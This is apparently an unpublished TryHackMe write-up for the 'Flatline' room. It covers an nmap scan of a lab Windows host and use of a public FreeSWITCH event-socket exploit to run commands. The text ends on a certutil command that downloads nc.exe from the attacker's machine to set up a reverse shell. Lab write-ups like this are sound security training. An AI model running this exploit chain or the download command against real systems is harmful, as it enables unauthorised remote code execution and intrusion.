---
title: Flatline Writeup
published: false
categories: writeups
tags: TryHackMe
challenge: https://tryhackme.com/room/flatline
---
**Challenge link** => [{{ page.challenge }}]({{ page.challenge }})

Today, we'll try a *free* room from **Nekrotic**

Nekrotick's [website](https://nekrotic.co.uk/)

---

Let's start by deploying the vm, and pinging the IP so we can check if we set everything up properly.

NMAP result:
```sh
┌[Gal1leoHackingStation]─[12:40-18/04]─[/home/gal1leo/TryHackMe/Flatline]
└╼root$nmap -sC -sV -Pn 10.10.251.214

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-18 12:40 IST
Nmap scan report for 10.10.251.214
Host is up (0.042s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE          VERSION

3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-04-18T11:41:08+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2022-04-17T11:22:10
|_Not valid after:  2022-10-17T11:22:10
|_ssl-date: 2022-04-18T11:41:09+00:00; 0s from scanner time.

8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

![](/assets/images/2022-04-18_12-48.png)

```sh
┌[Gal1leoHackingStation]─[12:46-18/04]─[/home/gal1leo/TryHackMe/Flatline]
└╼root$searchsploit -x 47799 > exploit.py
┌[Gal1leoHackingStation]─[12:47-18/04]─[/home/gal1leo/TryHackMe/Flatline]
└╼root$nano exploit.py 
```

```sh
└╼root$python3 exploit.py 10.10.251.214 dir
Authenticated
Content-Type: api/response
Content-Length: 2346
```
Looks like we can run commands on the system using the POC, but we don't see any output. Let's try get a reverse shell
![](/assets/images/2022-04-18_13-03.png)
```sh
┌[Gal1leoHackingStation]─[13:01-18/04]─[/home/gal1leo/TryHackMe/Flatline]
└╼root$python3 exploit.py 10.10.251.214 "certutil.exe -urlcache -f http://10.8.52.124:4242/nc.exe nc.exe"
```
